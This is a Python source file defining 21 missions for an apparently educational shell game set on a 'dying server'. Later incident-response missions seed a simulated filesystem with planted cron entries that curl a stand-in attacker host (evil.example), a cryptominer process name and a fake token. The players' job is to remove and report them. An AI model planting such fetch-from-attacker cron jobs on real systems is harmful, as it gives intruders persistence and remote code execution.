"""Terminal Caverns missions - "restore the dying server" (original scenario text, not copied from
any tutorial). Reduced from PLAN.md's ~40 missions to 21 for this pass: navigation/listing ->
create/move/remove -> grep/find -> text pipelines -> permissions -> redirects -> conditionals ->
one boss mission -> awk/sed -> $(...) command substitution -> a four-part "Final Incident" arc that
chains grep/awk/sort/uniq/$(...)  into one small investigation, mission by mission.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable

from .executor import run_line
from .fs import FS
from .parser import ParseError

History = list[tuple[str, str, int]]


@dataclass
class Mission:
    id: str
    title: str
    story: str
    fs_setup: Callable[[FS], None]
    objective: str
    check: Callable[[FS, History], bool]
    par_commands: int
    solution: list[str]
    hints: list[str] = field(default_factory=list)


def _write(fs: FS, path: str, text: str) -> None:
    fs.write(path, text, append=False)


def _any_output_has(history: History, needle: str) -> bool:
    return any(needle in out for _, out, _ in history)


def _last_output(history: History) -> str:
    return history[-1][1] if history else ""


MISSIONS: list[Mission] = [
    Mission(
        "navigate", "Into the Caverns",
        "The server room's logs are scattered across dated folders. Find this month's.",
        lambda fs: (fs.mkdir("reports", False), fs.mkdir("reports/2024", False), fs.mkdir("notes", False)),
        "cd into reports/2024.",
        lambda fs, h: fs.cwd == ["home", "player", "reports", "2024"],
        1, ["cd reports/2024"],
        ["cd takes a path - you can go straight to a nested directory in one step."],
    ),
    Mission(
        "hidden", "What's Hiding Here",
        "A rogue process left a dotfile behind. Normal `ls` won't show it.",
        lambda fs: (_write(fs, ".secret", "token=42\n"), _write(fs, "readme.txt", "nothing to see\n")),
        "List every file in this directory, including hidden ones.",
        lambda fs, h: _any_output_has(h, ".secret"),
        1, ["ls -a"],
        ["-a shows entries whose name starts with a dot."],
    ),
    Mission(
        "read", "The Welcome Sign",
        "A note was left for the next admin.",
        lambda fs: _write(fs, "welcome.txt", "Keeper, the kettle is in the break room.\n"),
        "Read welcome.txt.",
        lambda fs, h: _any_output_has(h, "kettle"),
        1, ["cat welcome.txt"],
    ),
    Mission(
        "scaffold", "Lay the Foundations",
        "A new service needs its skeleton before you can write any code.",
        lambda fs: None,
        "Create project/src (with -p, in one command) then an empty file project/src/main.py.",
        lambda fs, h: (n := fs.get("project/src/main.py")) is not None and not n.is_dir,
        2, ["mkdir -p project/src", "touch project/src/main.py"],
    ),
    Mission(
        "rename", "Ship It",
        "Drafts don't ship. Rename it.",
        lambda fs: _write(fs, "draft.txt", "v1 release notes\n"),
        "Rename draft.txt to final.txt.",
        lambda fs, h: fs.get("draft.txt") is None and fs.get("final.txt") is not None
        and fs.get("final.txt").content == "v1 release notes\n",
        1, ["mv draft.txt final.txt"],
    ),
    Mission(
        "backup", "Before You Touch Anything",
        "Rule one of server work: back it up first.",
        lambda fs: _write(fs, "config.yml", "timeout: 30\n"),
        "Copy config.yml to config.bak, keeping the original.",
        lambda fs, h: fs.get("config.yml") is not None and (n := fs.get("config.bak")) is not None
        and n.content == "timeout: 30\n",
        1, ["cp config.yml config.bak"],
    ),
    Mission(
        "cleanup", "Clear the Wreckage",
        "An old build directory is taking up space and confusing the deploy script.",
        lambda fs: (fs.mkdir("old_build/obj", True), _write(fs, "old_build/obj/a.o", "junk")),
        "Remove old_build and everything inside it.",
        lambda fs, h: fs.get("old_build") is None,
        1, ["rm -r old_build"],
    ),
    Mission(
        "grep", "Needle in the Log",
        "app.log is noisy. You only care about failures.",
        lambda fs: _write(fs, "app.log", "INFO boot\nERROR disk full\nINFO ready\nERROR disk full\nINFO ok\n"),
        "Show only the ERROR lines from app.log.",
        lambda fs, h: _last_output(h) == "ERROR disk full\nERROR disk full\n",
        1, ["grep ERROR app.log"],
    ),
    Mission(
        "find", "Every Script in the Build",
        "Before you can audit a project you have to know what's in it.",
        lambda fs: (
            fs.mkdir("project/src", True), fs.mkdir("project/tests", True),
            _write(fs, "project/src/main.py", ""), _write(fs, "project/src/util.py", ""),
            _write(fs, "project/tests/test_main.py", ""), _write(fs, "project/README.md", ""),
        ),
        "List every .py file under project (path and name).",
        lambda fs, h: _last_output(h) == "project/src/main.py\nproject/src/util.py\nproject/tests/test_main.py\n",
        1, ["find project -name *.py"],
        ["find's -name takes a pattern like it's one word - the shell won't expand it for you here."],
    ),
    Mission(
        "pipeline", "Who's on the Roster",
        "roster.txt lists name:role pairs. The boss wants a headcount per role.",
        lambda fs: _write(fs, "roster.txt", "ada:eng\nmay:eng\njo:ops\nka:eng\nli:ops\nbo:design\n"),
        "Print how many people have each role (role, then count), roles alphabetical.",
        lambda fs, h: _last_output(h) == "   1 design\n   3 eng\n   2 ops\n",
        1, ["cut -d: -f2 roster.txt | sort | uniq -c"],
        ["cut pulls out the role column, sort groups equal lines together, uniq -c counts runs - chain them with |."],
    ),
    Mission(
        "chmod", "Make It Executable",
        "deploy.sh exists but the deploy pipeline refuses to run it: wrong permissions.",
        lambda fs: _write(fs, "deploy.sh", "#!/bin/sh\necho deploying\n"),
        "Set deploy.sh's permissions to 755.",
        lambda fs, h: (n := fs.get("deploy.sh")) is not None and n.mode == 0o755,
        1, ["chmod 755 deploy.sh"],
    ),
    Mission(
        "redirect", "Write the Status Report",
        "Nobody reads logs. Write a short report instead.",
        lambda fs: None,
        "Create report.txt with 'status: ok' as the first line, then append 'checked: yes' as a second line.",
        lambda fs, h: (n := fs.get("report.txt")) is not None and n.content == "status: ok\nchecked: yes\n",
        2, ["echo status: ok > report.txt", "echo checked: yes >> report.txt"],
        ["> overwrites (or creates) a file; >> adds a line without erasing what's there."],
    ),
    Mission(
        "conditional", "Only If It's Really Broken",
        "The on-call bot should only page if ERROR actually shows up.",
        lambda fs: _write(fs, "app.log", "INFO boot\nERROR disk full\nINFO ready\n"),
        "Print PAGED, but only if app.log actually contains ERROR (one line, using &&).",
        lambda fs, h: _any_output_has(h, "PAGED") and len(h) <= 1,
        1, ["grep ERROR app.log && echo PAGED"],
        ["&& only runs the second command if the first one succeeded (grep exits 0 when it finds a match)."],
    ),
    Mission(
        "triage", "Server Triage",
        "The dying server, all at once: a world-writable config, a planted cron file, and a log "
        "nobody has read since the incident started. Fix what you can, then report what you found.",
        lambda fs: (
            fs.write("config.php", "db=prod\n", append=False), fs.chmod("777", "config.php"),
            _write(fs, "cron.job", "*/5 * * * * curl evil.example\n"),
            _write(fs, "access.log",
                   "INFO 200 /\nERROR 500 /pay\nINFO 200 /about\nERROR 500 /pay\nERROR 500 /login\nINFO 200 /\n"),
        ),
        "Fix config.php to 644, remove the planted cron.job, then write 'ERROR count: N' to report.txt "
        "where N is how many ERROR lines are in access.log.",
        lambda fs, h: (
            (n := fs.get("config.php")) is not None and n.mode == 0o644
            and fs.get("cron.job") is None
            and (r := fs.get("report.txt")) is not None
            and "ERROR count: 3" in r.content
        ),
        4, ["chmod 644 config.php", "rm cron.job", "grep -c ERROR access.log", "echo ERROR count: 3 > report.txt"],
        ["grep -c counts matching lines instead of printing them - read that count, then write it with echo > ."],
    ),
    Mission(
        "awk_field", "Column of Interest",
        "requests.log has three space-separated columns: time, status code, path. The boss only wants the codes.",
        lambda fs: _write(fs, "requests.log", "10:01 200 /\n10:02 500 /pay\n10:03 404 /x\n"),
        "Write just the status-code column from requests.log, one per line, into status.txt.",
        lambda fs, h: (n := fs.get("status.txt")) is not None and n.content == "200\n500\n404\n",
        1, ["awk '{print $2}' requests.log > status.txt"],
        ["awk '{print $N}' prints the Nth whitespace-separated field of each line."],
    ),
    Mission(
        "sed_fix", "Patch the Config",
        "app.conf was copied from the staging environment and never updated.",
        lambda fs: _write(fs, "app.conf", "env=staging\ndebug=staging-mode\n"),
        "Replace every occurrence of 'staging' with 'production' in app.conf (edit it in place).",
        lambda fs, h: (n := fs.get("app.conf")) is not None and n.content == "env=production\ndebug=production-mode\n",
        2, ["sed 's/staging/production/g' app.conf > app.conf.new", "mv app.conf.new app.conf"],
        ["sed 's/a/b/g' rewrites every occurrence on each line; without the trailing g, only the first.",
         "sed only writes to stdout - redirect to a new file, then mv it over the original."],
    ),
    Mission(
        "cmdsub", "Clean Sweep",
        "A build left .tmp files scattered under build/. Delete every one of them in a single command.",
        lambda fs: (fs.mkdir("build", False), _write(fs, "build/a.tmp", "x"), _write(fs, "build/b.tmp", "x"),
                    _write(fs, "keep.txt", "y")),
        'Remove every *.tmp file under build/ with one command, using $(...) to feed find into rm.',
        lambda fs, h: fs.get("build/a.tmp") is None and fs.get("build/b.tmp") is None and fs.get("keep.txt") is not None,
        1, ['rm $(find . -name "*.tmp")'],
        ["$(cmd) runs cmd and splices its output into the line - find's paths become rm's arguments."],
    ),
    Mission(
        "triage_rogue_process", "Final Incident: The Rogue Process",
        "Alerts are firing again - a bigger incident this time, in four parts. First: a process "
        "listing from the dying server. Something in here shouldn't be running.",
        lambda fs: _write(fs, "ps.txt", "PID CMD\n101 sshd\n404 xmrig-miner\n205 nginx\n310 cron\n"),
        "Find the cryptominer process in ps.txt and write just its name to suspect.txt.",
        lambda fs, h: (n := fs.get("suspect.txt")) is not None and n.content == "xmrig-miner\n",
        1, ["grep xmrig ps.txt | awk '{print $2}' > suspect.txt"],
        ["cat ps.txt first to see what you're looking at - one name obviously isn't a normal server process."],
    ),
    Mission(
        "triage_cron", "Final Incident: The Planted Cron",
        "Part two: the rogue process didn't start itself. Something in the cron jobs is launching it.",
        lambda fs: (fs.mkdir("etc/cron.d", True),
                    _write(fs, "etc/cron.d/daily", "0 2 * * * backup.sh\n"),
                    _write(fs, "etc/cron.d/evil", "*/5 * * * * curl http://evil.example/x\n"),
                    _write(fs, "etc/cron.d/weekly", "0 3 * * 0 cleanup.sh\n")),
        "Exactly one file under etc/cron.d calls out to evil.example. Delete just that file.",
        lambda fs, h: fs.get("etc/cron.d/evil") is None and fs.get("etc/cron.d/daily") is not None
        and fs.get("etc/cron.d/weekly") is not None,
        1, ["rm $(grep -l evil.example etc/cron.d/*)"],
        ["grep -l prints matching FILE NAMES instead of matching lines - perfect for feeding straight into rm."],
    ),
    Mission(
        "triage_ip", "Final Incident: The Access Log",
        "Part three: one IP address is behind most of the failures. Find it before you block it.",
        lambda fs: _write(fs, "access.log",
                           "INFO 200 1.1.1.1 /\nERROR 500 9.9.9.9 /pay\nINFO 200 1.1.1.1 /\n"
                           "ERROR 500 9.9.9.9 /login\nERROR 500 9.9.9.9 /pay\nINFO 200 2.2.2.2 /\n"),
        "Write the IP address responsible for the most ERROR lines in access.log to attacker.txt.",
        lambda fs, h: (n := fs.get("attacker.txt")) is not None and n.content == "9.9.9.9\n",
        1, ["grep ERROR access.log | awk '{print $3}' | sort | uniq -c | sort -rn | head -n 1 "
            "| awk '{print $2}' > attacker.txt"],
        ["grep the ERROR lines, pull the IP column with awk, then sort | uniq -c | sort -rn ranks them by count.",
         "head -n 1 keeps just the top one; a second awk strips uniq -c's count column back off."],
    ),
    Mission(
        "triage_report", "Final Incident: The Report",
        "Part four, the close-out: write the incident report from the two files you already found - "
        "don't retype what you can pull in with $(...).",
        lambda fs: (_write(fs, "suspect.txt", "xmrig-miner\n"), _write(fs, "attacker.txt", "9.9.9.9\n")),
        'Write incident.txt as exactly: "process: xmrig-miner, attacker: 9.9.9.9"',
        lambda fs, h: (n := fs.get("incident.txt")) is not None
        and n.content == "process: xmrig-miner, attacker: 9.9.9.9\n",
        1, ['echo "process: $(cat suspect.txt), attacker: $(cat attacker.txt)" > incident.txt'],
        ["$(cat file) drops that file's content right into the string you're building."],
    ),
]


class MissionRun:
    """One attempt: a fresh FS, a running command history, done once `mission.check` passes."""

    def __init__(self, mission: Mission):
        self.mission = mission
        self.fs = FS()
        mission.fs_setup(self.fs)
        self.history: History = []
        self.done = False

    @property
    def commands_used(self) -> int:
        return len(self.history)

    def run(self, line: str) -> str:
        if not line.strip():
            return ""
        try:
            output, code = run_line(self.fs, line)
        except ParseError as e:
            output, code = f"sh: {e}\n", 2
        self.history.append((line, output, code))
        if not self.done and self.mission.check(self.fs, self.history):
            self.done = True
        return output
